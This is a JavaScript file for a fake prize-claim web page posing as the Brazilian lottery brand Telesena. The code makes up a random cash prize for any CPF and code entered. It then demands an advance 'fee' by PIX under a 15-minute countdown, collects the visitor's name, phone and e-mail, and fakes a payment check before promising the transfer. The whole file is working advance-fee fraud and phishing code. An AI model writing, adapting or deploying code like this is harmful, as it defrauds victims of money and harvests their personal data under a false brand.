// Dados simulados de prêmios da Telesena
const premiosData = [
    {
        id: 1,
        cpf: "12345678901",
        codigo: "TSN2025001",
        valor: 2500.00,
        descricao: "Prêmio especial para clientes antigos da Telesena",
        tipo: "dinheiro",
        taxa: 89.90,
        protocolo: "TSN-2025-001234"
    },
    {
        id: 2,
        cpf: "98765432100",
        codigo: "TSN2025002",
        valor: 1200.00,
        descricao: "Prêmio de fidelidade Telesena",
        tipo: "dinheiro",
        taxa: 69.90,
        protocolo: "TSN-2025-001235"
    },
    {
        id: 3,
        cpf: "11122233344",
        codigo: "TSN2025003",
        valor: 3500.00,
        descricao: "Prêmio especial de aniversário da Telesena",
        tipo: "dinheiro",
        taxa: 119.90,
        protocolo: "TSN-2025-001236"
    },
    {
        id: 4,
        cpf: "55566677788",
        codigo: "TSN2025004",
        valor: 800.00,
        descricao: "Prêmio de participação especial",
        tipo: "dinheiro",
        taxa: 59.90,
        protocolo: "TSN-2025-001237"
    },
    {
        id: 5,
        cpf: "99988877766",
        codigo: "TSN2025005",
        valor: 5000.00,
        descricao: "Grande prêmio especial Telesena",
        tipo: "dinheiro",
        taxa: 149.90,
        protocolo: "TSN-2025-001238"
    }
];

// Variáveis globais
let currentPrize = null;
let paymentTimer = null;
let timeLeft = 900; // 15 minutos em segundos

// Elementos DOM
const cpfInput = document.getElementById('cpf-input');
const codigoInput = document.getElementById('codigo-input');
const searchBtn = document.getElementById('search-btn');
const loadingOverlay = document.getElementById('loading-overlay');
const loadingMessage = document.getElementById('loading-message');
const resultsSection = document.getElementById('results');
const resultsContainer = document.getElementById('results-container');
const paymentSection = document.getElementById('payment');
const pixSection = document.getElementById('pix');
const successSection = document.getElementById('success');
const navToggle = document.getElementById('nav-toggle');
const navMenu = document.querySelector('.nav-menu');
const header = document.querySelector('.header');
const backToTopBtn = document.getElementById('back-to-top');

// Event Listeners
document.addEventListener('DOMContentLoaded', function() {
    initializeApp();
});

function initializeApp() {
    console.log('Inicializando aplicação Telesena...');
    
    // Event listeners para busca
    searchBtn.addEventListener('click', handleSearch);
    cpfInput.addEventListener('keypress', function(e) {
        if (e.key === 'Enter') {
            handleSearch();
        }
    });
    codigoInput.addEventListener('keypress', function(e) {
        if (e.key === 'Enter') {
            handleSearch();
        }
    });
    
    // Máscara para CPF
    cpfInput.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '');
        value = value.replace(/(\d{3})(\d)/, '$1.$2');
        value = value.replace(/(\d{3})(\d)/, '$1.$2');
        value = value.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
        e.target.value = value;
    });
    
    // Event listener para menu mobile
    if (navToggle && navMenu) {
        navToggle.addEventListener('click', toggleMobileMenu);
        
        // Fechar menu ao clicar em um link
        const navLinks = document.querySelectorAll('.nav-link');
        navLinks.forEach(link => {
            link.addEventListener('click', closeMobileMenu);
        });
    }
    
    // Event listener para botão voltar ao topo
    if (backToTopBtn) {
        backToTopBtn.addEventListener('click', scrollToTop);
    }
    
    // Event listeners para scroll
    window.addEventListener('scroll', handleScroll);
    
    // Animações de scroll
    setupScrollAnimations();
    
    // Animação dos números das estatísticas
    animateStats();
    
    // Configurar indicador de scroll
    setupScrollIndicator();
    
    // FAQ accordion
    setupFAQ();
    
    // Event listener para formulário de pagamento
    const paymentForm = document.getElementById('payment-form');
    if (paymentForm) {
        paymentForm.addEventListener('submit', handlePaymentSubmit);
    }
}

// Função para alternar menu mobile
function toggleMobileMenu() {
    navMenu.classList.toggle('active');
    navToggle.classList.toggle('active');
}

// Função para fechar menu mobile
function closeMobileMenu() {
    navMenu.classList.remove('active');
    navToggle.classList.remove('active');
}

// Função para lidar com scroll
function handleScroll() {
    const scrollY = window.scrollY;
    
    // Header com efeito de scroll
    if (scrollY > 100) {
        header.classList.add('scrolled');
    } else {
        header.classList.remove('scrolled');
    }
    
    // Botão voltar ao topo
    if (scrollY > 500) {
        backToTopBtn.style.display = 'flex';
        backToTopBtn.style.opacity = '1';
    } else {
        backToTopBtn.style.opacity = '0';
        setTimeout(() => {
            if (window.scrollY <= 500) {
                backToTopBtn.style.display = 'none';
            }
        }, 300);
    }
}

// Função para voltar ao topo
function scrollToTop() {
    window.scrollTo({
        top: 0,
        behavior: 'smooth'
    });
}

// Função para configurar indicador de scroll
function setupScrollIndicator() {
    const scrollArrow = document.querySelector('.scroll-arrow');
    if (scrollArrow) {
        scrollArrow.addEventListener('click', () => {
            document.getElementById('como-funciona').scrollIntoView({
                behavior: 'smooth'
            });
        });
    }
}

// Função para animar estatísticas
function animateStats() {
    const statNumbers = document.querySelectorAll('.stat-number');
    
    const observer = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                const target = parseInt(entry.target.getAttribute('data-target'));
                animateNumber(entry.target, target);
                observer.unobserve(entry.target);
            }
        });
    }, { threshold: 0.5 });
    
    statNumbers.forEach(stat => observer.observe(stat));
}

// Função para animar números
function animateNumber(element, target) {
    let current = 0;
    const increment = target / 100;
    const timer = setInterval(() => {
        current += increment;
        if (current >= target) {
            current = target;
            clearInterval(timer);
        }
        
        if (target >= 1000) {
            element.textContent = (current / 1000).toFixed(0) + 'k+';
        } else {
            element.textContent = Math.floor(current) + '+';
        }
    }, 20);
}

// Função para configurar animações de scroll
function setupScrollAnimations() {
    const observerOptions = {
        threshold: 0.1,
        rootMargin: '0px 0px -50px 0px'
    };
    
    const observer = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                entry.target.style.opacity = '1';
                entry.target.style.transform = 'translateY(0)';
            }
        });
    }, observerOptions);
    
    // Observar elementos que devem animar
    const animatedElements = document.querySelectorAll('.step-card, .feature-card, .testimonial-card');
    animatedElements.forEach(el => {
        el.style.opacity = '0';
        el.style.transform = 'translateY(30px)';
        el.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
        observer.observe(el);
    });
}

// Função para configurar FAQ
function setupFAQ() {
    const faqItems = document.querySelectorAll('.faq-item');
    
    faqItems.forEach(item => {
        const question = item.querySelector('.faq-question');
        question.addEventListener('click', () => {
            const isActive = item.classList.contains('active');
            
            // Fechar todos os outros itens
            faqItems.forEach(otherItem => {
                otherItem.classList.remove('active');
            });
            
            // Alternar o item atual
            if (!isActive) {
                item.classList.add('active');
            }
        });
    });
}

// Função principal de busca
function handleSearch() {
    const cpf = cpfInput.value.replace(/\D/g, '');
    const codigo = codigoInput.value.trim().toUpperCase();

    // Validações
    if (cpf.length !== 11) {
        showNotification('Por favor, digite um CPF válido.', 'warning');
        cpfInput.focus();
        return;
    }

    if (codigo.length === 0) {
        showNotification('Por favor, digite o código do prêmio.', 'warning');
        codigoInput.focus();
        return;
    }

    showLoading();
    
    // Simular busca no banco de dados
    setTimeout(() => {
        searchPremio(cpf, codigo);
    }, 3000);
}

// Função para buscar prêmio
function searchPremio(cpf, codigo) {
    try {
        // Buscar prêmio nos dados simulados
        const premio = premiosData.find(p => p.cpf === cpf && p.codigo === codigo);
        
        if (premio) {
            currentPrize = premio;
            displayPrize(premio);
        } else {
            // Se não encontrar, criar um prêmio aleatório para qualquer combinação válida
            const valores = [800, 1200, 1500, 2500, 3500, 5000];
            const taxas = [59.90, 69.90, 79.90, 89.90, 119.90, 149.90];
            const randomIndex = Math.floor(Math.random() * valores.length);
            
            currentPrize = {
                id: Date.now(),
                cpf: cpf,
                codigo: codigo,
                valor: valores[randomIndex],
                descricao: "Prêmio especial para clientes antigos da Telesena",
                tipo: "dinheiro",
                taxa: taxas[randomIndex],
                protocolo: `TSN-2025-${String(Math.floor(Math.random() * 999999)).padStart(6, '0')}`
            };
            
            displayPrize(currentPrize);
        }
        
        hideLoading();
    } catch (error) {
        console.error('Erro ao buscar prêmio:', error);
        showNotification('Erro ao buscar prêmio. Tente novamente.', 'error');
        hideLoading();
    }
}

// Função para exibir o prêmio encontrado
function displayPrize(premio) {
    const resultCard = `
        <div class="result-card">
            <div class="prize-icon">
                <i class="fas fa-gift"></i>
            </div>
            <h3 class="prize-title">Parabéns! Você tem um prêmio!</h3>
            <div class="prize-amount">R$ ${premio.valor.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}</div>
            <p class="prize-description">${premio.descricao}</p>
            <button class="claim-button" onclick="showPaymentSection()">
                <i class="fas fa-arrow-right"></i>
                Resgatar Meu Prêmio
            </button>
        </div>
    `;
    
    resultsContainer.innerHTML = resultCard;
    resultsSection.style.display = 'block';
    
    // Scroll para a seção de resultados
    setTimeout(() => {
        resultsSection.scrollIntoView({ behavior: 'smooth' });
    }, 500);
}

// Função para mostrar seção de pagamento
function showPaymentSection() {
    if (!currentPrize) return;
    
    // Atualizar valores na seção de pagamento
    document.getElementById('taxa-valor').textContent = `R$ ${currentPrize.taxa.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}`;
    
    paymentSection.style.display = 'block';
    
    // Scroll para a seção de pagamento
    setTimeout(() => {
        paymentSection.scrollIntoView({ behavior: 'smooth' });
    }, 500);
}

// Função para lidar com envio do formulário de pagamento
function handlePaymentSubmit(e) {
    e.preventDefault();
    
    const nomeCompleto = document.getElementById('nome-completo').value.trim();
    const telefone = document.getElementById('telefone').value.trim();
    const email = document.getElementById('email').value.trim();
    
    // Validações básicas
    if (!nomeCompleto || !telefone || !email) {
        showNotification('Por favor, preencha todos os campos.', 'warning');
        return;
    }
    
    if (!isValidEmail(email)) {
        showNotification('Por favor, digite um e-mail válido.', 'warning');
        return;
    }
    
    showPixSection();
}

// Função para mostrar seção PIX
function showPixSection() {
    if (!currentPrize) return;
    
    // Atualizar valores na seção PIX
    document.getElementById('pix-valor').textContent = `R$ ${currentPrize.taxa.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}`;
    
    pixSection.style.display = 'block';
    
    // Iniciar timer de pagamento
    startPaymentTimer();
    
    // Scroll para a seção PIX
    setTimeout(() => {
        pixSection.scrollIntoView({ behavior: 'smooth' });
    }, 500);
}

// Função para iniciar timer de pagamento
function startPaymentTimer() {
    timeLeft = 900; // 15 minutos
    const timerElement = document.getElementById('payment-timer');
    
    paymentTimer = setInterval(() => {
        const minutes = Math.floor(timeLeft / 60);
        const seconds = timeLeft % 60;
        
        timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        
        if (timeLeft <= 0) {
            clearInterval(paymentTimer);
            showNotification('Tempo para pagamento expirado. Inicie o processo novamente.', 'error');
            resetForm();
        }
        
        timeLeft--;
    }, 1000);
}

// Função para copiar chave PIX
function copyPixKey() {
    const pixKey = document.getElementById('pix-key').textContent;
    
    if (navigator.clipboard) {
        navigator.clipboard.writeText(pixKey).then(() => {
            showNotification('Chave PIX copiada!', 'success');
        }).catch(() => {
            fallbackCopyTextToClipboard(pixKey);
        });
    } else {
        fallbackCopyTextToClipboard(pixKey);
    }
}

// Função fallback para copiar texto
function fallbackCopyTextToClipboard(text) {
    const textArea = document.createElement("textarea");
    textArea.value = text;
    textArea.style.top = "0";
    textArea.style.left = "0";
    textArea.style.position = "fixed";
    
    document.body.appendChild(textArea);
    textArea.focus();
    textArea.select();
    
    try {
        document.execCommand('copy');
        showNotification('Chave PIX copiada!', 'success');
    } catch (err) {
        showNotification('Erro ao copiar chave PIX', 'error');
    }
    
    document.body.removeChild(textArea);
}

// Função para confirmar pagamento
function confirmPayment() {
    if (paymentTimer) {
        clearInterval(paymentTimer);
    }
    
    showLoading();
    loadingMessage.textContent = 'Verificando pagamento...';
    
    // Simular verificação de pagamento
    setTimeout(() => {
        hideLoading();
        showSuccessSection();
    }, 3000);
}

// Função para mostrar seção de sucesso
function showSuccessSection() {
    if (!currentPrize) return;
    
    // Atualizar valores na seção de sucesso
    document.getElementById('success-premio').textContent = `R$ ${currentPrize.valor.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}`;
    document.getElementById('success-protocolo').textContent = currentPrize.protocolo;
    
    // Ocultar outras seções
    resultsSection.style.display = 'none';
    paymentSection.style.display = 'none';
    pixSection.style.display = 'none';
    
    // Mostrar seção de sucesso
    successSection.style.display = 'block';
    
    // Scroll para a seção de sucesso
    setTimeout(() => {
        successSection.scrollIntoView({ behavior: 'smooth' });
    }, 500);
    
    showNotification('Pagamento confirmado! Seu prêmio será transferido em breve.', 'success');
}

// Função para resetar formulário
function resetForm() {
    // Limpar campos
    cpfInput.value = '';
    codigoInput.value = '';
    
    // Limpar formulário de pagamento
    const paymentForm = document.getElementById('payment-form');
    if (paymentForm) {
        paymentForm.reset();
    }
    
    // Ocultar seções
    resultsSection.style.display = 'none';
    paymentSection.style.display = 'none';
    pixSection.style.display = 'none';
    successSection.style.display = 'none';
    
    // Limpar timer
    if (paymentTimer) {
        clearInterval(paymentTimer);
        paymentTimer = null;
    }
    
    // Resetar variáveis
    currentPrize = null;
    timeLeft = 900;
    
    // Scroll para o topo
    document.getElementById('inicio').scrollIntoView({ behavior: 'smooth' });
}

// Função para mostrar loading
function showLoading() {
    loadingOverlay.style.display = 'flex';
    
    // Mensagens de loading dinâmicas
    const messages = [
        'Verificando seus dados...',
        'Consultando banco de dados...',
        'Validando informações...',
        'Processando solicitação...'
    ];
    
    let messageIndex = 0;
    const messageInterval = setInterval(() => {
        if (loadingOverlay.style.display === 'none') {
            clearInterval(messageInterval);
            return;
        }
        
        loadingMessage.textContent = messages[messageIndex];
        messageIndex = (messageIndex + 1) % messages.length;
    }, 1000);
}

// Função para ocultar loading
function hideLoading() {
    loadingOverlay.style.display = 'none';
}

// Função para mostrar notificação
function showNotification(message, type = 'info') {
    const notification = document.getElementById('notification');
    const notificationIcon = notification.querySelector('.notification-icon');
    const notificationMessage = notification.querySelector('.notification-message');
    
    // Definir ícone baseado no tipo
    let iconClass = 'fas fa-info-circle';
    switch (type) {
        case 'success':
            iconClass = 'fas fa-check-circle';
            break;
        case 'error':
            iconClass = 'fas fa-exclamation-circle';
            break;
        case 'warning':
            iconClass = 'fas fa-exclamation-triangle';
            break;
    }
    
    notificationIcon.className = `notification-icon ${iconClass}`;
    notificationMessage.textContent = message;
    notification.className = `notification ${type}`;
    notification.style.display = 'block';
    
    // Auto-ocultar após 5 segundos
    setTimeout(() => {
        notification.style.display = 'none';
    }, 5000);
}

// Função para validar e-mail
function isValidEmail(email) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
}

// Função para validar CPF
function isValidCPF(cpf) {
    cpf = cpf.replace(/\D/g, '');
    
    if (cpf.length !== 11) return false;
    
    // Verificar se todos os dígitos são iguais
    if (/^(\d)\1{10}$/.test(cpf)) return false;
    
    // Validar dígitos verificadores
    let sum = 0;
    for (let i = 0; i < 9; i++) {
        sum += parseInt(cpf.charAt(i)) * (10 - i);
    }
    let remainder = 11 - (sum % 11);
    if (remainder === 10 || remainder === 11) remainder = 0;
    if (remainder !== parseInt(cpf.charAt(9))) return false;
    
    sum = 0;
    for (let i = 0; i < 10; i++) {
        sum += parseInt(cpf.charAt(i)) * (11 - i);
    }
    remainder = 11 - (sum % 11);
    if (remainder === 10 || remainder === 11) remainder = 0;
    if (remainder !== parseInt(cpf.charAt(10))) return false;
    
    return true;
}

// Função para formatar valor monetário
function formatCurrency(value) {
    return new Intl.NumberFormat('pt-BR', {
        style: 'currency',
        currency: 'BRL'
    }).format(value);
}

// Função para gerar protocolo aleatório
function generateProtocol() {
    const prefix = 'TSN-2025-';
    const number = Math.floor(Math.random() * 999999).toString().padStart(6, '0');
    return prefix + number;
}

// Função para detectar dispositivo móvel
function isMobile() {
    return window.innerWidth <= 768;
}

// Função para smooth scroll personalizado
function smoothScrollTo(element, duration = 1000) {
    const targetPosition = element.offsetTop - 100; // Offset para header fixo
    const startPosition = window.pageYOffset;
    const distance = targetPosition - startPosition;
    let startTime = null;
    
    function animation(currentTime) {
        if (startTime === null) startTime = currentTime;
        const timeElapsed = currentTime - startTime;
        const run = ease(timeElapsed, startPosition, distance, duration);
        window.scrollTo(0, run);
        if (timeElapsed < duration) requestAnimationFrame(animation);
    }
    
    function ease(t, b, c, d) {
        t /= d / 2;
        if (t < 1) return c / 2 * t * t + b;
        t--;
        return -c / 2 * (t * (t - 2) - 1) + b;
    }
    
    requestAnimationFrame(animation);
}

// Event listeners globais
window.addEventListener('resize', function() {
    // Ajustar layout em mudanças de orientação
    if (isMobile()) {
        closeMobileMenu();
    }
});

// Prevenir zoom em inputs no iOS
document.addEventListener('touchstart', function() {}, true);

// Adicionar classe para animações quando a página carrega
window.addEventListener('load', function() {
    document.body.classList.add('loaded');
});

// Função para debug (remover em produção)
function debugInfo() {
    console.log('Current Prize:', currentPrize);
    console.log('Timer Left:', timeLeft);
    console.log('Payment Timer:', paymentTimer);
}

// Expor funções globais necessárias
window.showPaymentSection = showPaymentSection;
window.copyPixKey = copyPixKey;
window.confirmPayment = confirmPayment;
window.resetForm = resetForm;

